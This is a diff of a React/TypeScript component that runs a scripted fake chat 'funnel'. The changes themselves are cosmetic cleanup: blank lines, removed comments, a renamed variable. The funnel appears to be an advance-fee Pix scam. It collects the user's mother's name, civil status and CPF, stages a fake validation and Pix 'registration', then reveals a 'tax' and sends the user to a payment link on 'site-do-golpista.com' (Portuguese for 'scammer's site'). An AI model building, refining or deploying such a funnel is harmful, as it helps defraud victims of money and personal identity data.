@@ -100,6 +100,7 @@ const funnelDefinition: {
     "paymentLink": "https://site-do-golpista.com/checkout-pix"
   },
   "steps": {
+
     "step1_video": {
       "type": "displayVideo",
       "delay_ms": 1000,
@@ -110,6 +111,7 @@ const funnelDefinition: {
       },
       "nextStep": "step2_intro_and_ask_mother"
     },
+
     "step2_intro_and_ask_mother": {
       "type": "multipleChoice",
       "delay_ms": 2500,
@@ -123,6 +125,7 @@ const funnelDefinition: {
         ]
       }
     },
+
     "step3_ask_civil_status": {
       "type": "multipleChoice",
       "delay_ms": 1500,
@@ -136,6 +139,7 @@ const funnelDefinition: {
         ]
       }
     },
+
     "step4_loading_validation": {
       "type": "loading",
       "delay_ms": 500,
@@ -145,6 +149,7 @@ const funnelDefinition: {
       },
       "nextStep": "step5_confirmation_and_audio"
     },
+
     "step5_confirmation_and_audio": {
       "type": "displayMessage",
       "delay_ms": 500,
@@ -162,6 +167,7 @@ const funnelDefinition: {
       },
       "nextStep": "step6_ask_pix_type"
     },
+
     "step6_ask_pix_type": {
       "type": "multipleChoice",
       "delay_ms": 2500,
@@ -215,6 +221,7 @@ const funnelDefinition: {
       },
       "nextStep": "step9_pix_registered_and_audio"
     },
+
     "step9_pix_registered_and_audio": {
       "type": "displayMessage",
       "delay_ms": 500,
@@ -231,6 +238,7 @@ const funnelDefinition: {
       },
       "nextStep": "step10_ask_generate_receipt"
     },
+
     "step10_ask_generate_receipt": {
       "type": "multipleChoice",
       "delay_ms": 3500,
@@ -241,6 +249,7 @@ const funnelDefinition: {
         ]
       }
     },
+
     "step11_generating_receipt_image": {
       "type": "displayMessage",
       "delay_ms": 1000,
@@ -249,6 +258,7 @@ const funnelDefinition: {
       },
       "nextStep": "step12_reveal_tax_and_audio"
     },
+
     "step12_reveal_tax_and_audio": {
       "type": "displayMessage",
       "delay_ms": 3000,
@@ -264,6 +274,7 @@ const funnelDefinition: {
       },
       "nextStep": "step13_final_justification_and_cta"
     },
+
     "step13_final_justification_and_cta": {
       "type": "multipleChoice",
       "delay_ms": 4000,
@@ -287,7 +298,7 @@ const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
 const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
 const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1';
 
-const DEFAULT_APPEARANCE_DELAY_MS = 500; 
+const DEFAULT_APPEARANCE_DELAY_MS = 500;
 
 const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
@@ -578,9 +589,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentVideoMessage(formatText(data.message));
               videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
               setShowVideoPlaceholderOverlay(true);
-              // The step is now "active" and waiting for user. Bot is not "typing".
-              // setIsBotTyping(false) will be called after the switch.
-              break; 
+              break;
             }
             case 'multipleChoice': {
               const data = stepConfig.data as FlowStepDataMultipleChoice;
@@ -627,7 +636,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentTextInputConfig(data);
               setIsTextInputActive(true);
               setTextInputValue(""); // Clear previous input
-              // setIsBotTyping(false) will be called after the switch.
               break;
             }
              case 'displayDynamicImage': {
@@ -708,31 +716,24 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           // This block handles re-formatting content of an already displayed step if flowVariables change.
           // For example, if a {{variable}} in a currentDisplayMessage needs to update.
           if (currentDisplayMessage) { // If a display message is currently shown
-             const data = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
-              if (data && data.type === 'displayMessage') { // Check if current step is indeed displayMessage
+             const currentStepData = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
+              if (currentStepData && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).type === 'displayMessage') {
                    setCurrentDisplayMessage(prev => prev ? {
                       ...prev,
-                      displayTitle: formatText(data.title),
-                      text: data.message ? formatText(data.message) : undefined,
-                      displayDetails: formatDetailsObject(data.details),
+                      displayTitle: formatText(currentStepData.title),
+                      text: currentStepData.message ? formatText(currentStepData.message) : undefined,
+                      displayDetails: formatDetailsObject(currentStepData.details),
                       // icon doesn't change dynamically based on flowVariables typically
                   } : null);
               }
           }
-          // For simple text messages already in the `messages` array, re-rendering due to `flowVariables`
-          // change in `formatText` would happen automatically if `messages` itself is a dependency,
-          // but `messages` isn't a direct dependency of this effect for this purpose.
-          // Instead, components rendering messages use `formatText` directly.
-          // If a multipleChoice step's options text needs to be dynamic, it would re-render correctly
-          // when `flowVariables` change because the `messages.map` in JSX uses `formatText`.
         }
-
         setIsBotTyping(false); // Content is now ready or waiting for interaction
+
 
         // Auto-transition for non-interactive steps or steps that complete an action
         const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                   (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');
-                                  // Removed 'loading' as it handles its own transition
 
         // Define delay for auto-transition for displayMessage/Image. Loading steps handle their own.
         let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
@@ -773,7 +774,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         autoTransitionTimerRef.current = null;
       }
     };
-  }, [currentStepKey, initialParams]); // Removed flowVariables, messages
+  }, [currentStepKey, initialParams]);
 
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -783,12 +784,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const handleOptionClick = (option: ChatOption) => {
     handleUserActionAndNavigate(); // Clear previous step's UI elements and timers
 
-    const userMessageText = option.text || "Opção selecionada"; 
+    const userMessageText = option.text || "Opção selecionada";
     const userMessageId = `user-${Date.now()}`;
 
     setMessages(prevMsgs => {
       let msgsWithUserReply = [...prevMsgs, { id: userMessageId, sender: 'user', text: userMessageText }];
-      
+
       // Find the last bot message with options and remove its options
       let repliedToBotMessageIndex = -1;
       for (let i = msgsWithUserReply.length - 2; i >= 0; i--) { // Start from message before user's reply
@@ -807,7 +808,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       }
       return msgsWithUserReply;
     });
-    
+
     setIsBotTyping(true); // Bot starts "typing" for the next step
 
     // Handle specific actions tied to options
@@ -871,11 +872,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000); // Remove after 2s
         return;
     }
-    
+
     handleUserActionAndNavigate(); // Clear text input UI
 
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
-    
+
     setIsBotTyping(true); // Bot starts "typing"
 
     // Update flow variable if specified
@@ -955,7 +956,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {/* Dynamic Image Display Section - Rendered when currentImageDetails is set and bot is not typing/loading */}
       {currentImageDetails && !isBotTyping && !isLoadingStep && (
         <div className="message-container bot-message-container image-display-block">
-          {/* Removed bot avatar from here */}
           <div className="message bot-message" style={{ padding: '5px' }}> {/* Adjusted padding for image block */}
             {currentImageDetails.message && <p style={{ marginBottom: '8px', padding: '5px 10px', whiteSpace: 'pre-line'}}>{currentImageDetails.message}</p>}
             <Image
@@ -974,7 +974,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {/* Display Message Section - Rendered when currentDisplayMessage is set and bot is not typing/loading */}
       {currentDisplayMessage && !isLoadingStep && !isBotTyping && (
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: 'auto', display: 'flex'}}>
-           {/* Removed bot avatar from here */}
            <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}> {/* Ensure message block takes appropriate width */}
               {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                 {getIconComponent(currentDisplayMessage.displayIcon)}
@@ -1004,7 +1003,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {/* Message History - Rendered always */}
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
-            {/* Removed bot avatar from bot messages here */}
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
               {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
               {/* Options are only shown if they exist on the message and current step allows interaction (not typing, etc.) */}
@@ -1049,7 +1047,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {/* Typing Indicator - Rendered when isBotTyping is true */}
       {isBotTyping && (
          <div className="message-container bot-message-container">
-             {/* Removed bot avatar from typing indicator */}
             <div className="message bot-message typing-indicator">
                 <span className="dot"></span><span className="dot"></span><span className="dot"></span>
             </div>
@@ -1189,4 +1186,3 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 };
 
 export default SimulatedChatFlow;
-
